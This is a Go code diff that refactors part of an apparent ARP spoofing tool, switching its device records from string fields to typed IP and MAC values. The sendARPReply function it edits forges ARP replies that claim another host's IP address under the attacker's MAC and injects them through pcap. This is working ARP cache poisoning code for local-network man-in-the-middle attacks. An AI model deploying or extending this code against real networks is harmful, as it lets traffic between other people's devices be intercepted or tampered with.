@@ -49,11 +49,11 @@ func ping(ips ...string) {
 }
 
 type DeviceInfo struct {
-	IP  string
-	MAC string
+	IP  net.IP
+	MAC net.HardwareAddr
 }
 
-func NewDeviceInfo(ip, mac string) *DeviceInfo {
+func NewDeviceInfo(ip net.IP, mac net.HardwareAddr) *DeviceInfo {
 	return &DeviceInfo{
 		IP:  ip,
 		MAC: mac,
@@ -80,13 +80,21 @@ func mapIPstoMAC(ips ...string) ([]*DeviceInfo, error) {
 				skip = true
 				continue
 			}
+
 			if skip {
 				skip = false
 				continue
 			}
+
 			fields := strings.Fields(line)
+
 			if ip == fields[0] {
-				devices = append(devices, NewDeviceInfo(fields[0], fields[1]))
+				mac, err := net.ParseMAC(fields[1])
+				if err != nil {
+					return nil, err
+				}
+
+				devices = append(devices, NewDeviceInfo(net.ParseIP(fields[0]), mac))
 				break
 			}
 		}
@@ -96,24 +104,9 @@ func mapIPstoMAC(ips ...string) ([]*DeviceInfo, error) {
 }
 
 func sendARPReply(from, to *DeviceInfo, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle) error {
-	fromIP := net.ParseIP(from.IP)
-	/*
-		fromMAC, err := net.ParseMAC(from.MAC)
-		if err != nil {
-			return err
-		}
-	*/
-
-	toMAC, err := net.ParseMAC(to.MAC)
-	if err != nil {
-		return err
-	}
-
-	toIP := net.ParseIP(to.IP)
-
 	eth := layers.Ethernet{
 		SrcMAC:       attackerInfo.MAC,
-		DstMAC:       toMAC,
+		DstMAC:       to.MAC,
 		EthernetType: layers.EthernetTypeARP,
 	}
 
@@ -124,9 +117,9 @@ func sendARPReply(from, to *DeviceInfo, attackerInfo *AttackerInfo, deviceHandle
 		ProtAddressSize:   4,
 		Operation:         layers.ARPReply,
 		SourceHwAddress:   attackerInfo.MAC,
-		SourceProtAddress: fromIP.To4(),
-		DstHwAddress:      toMAC,
-		DstProtAddress:    toIP.To4(),
+		SourceProtAddress: from.IP.To4(),
+		DstHwAddress:      to.MAC,
+		DstProtAddress:    to.IP.To4(),
 	}
 
 	buf := gopacket.NewSerializeBuffer()
@@ -135,11 +128,11 @@ func sendARPReply(from, to *DeviceInfo, attackerInfo *AttackerInfo, deviceHandle
 		ComputeChecksums: true,
 	}
 
-	if err = gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
+	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
 		return err
 	}
 
-	if err = deviceHandle.WritePacketData(buf.Bytes()); err != nil {
+	if err := deviceHandle.WritePacketData(buf.Bytes()); err != nil {
 		return err
 	}
 
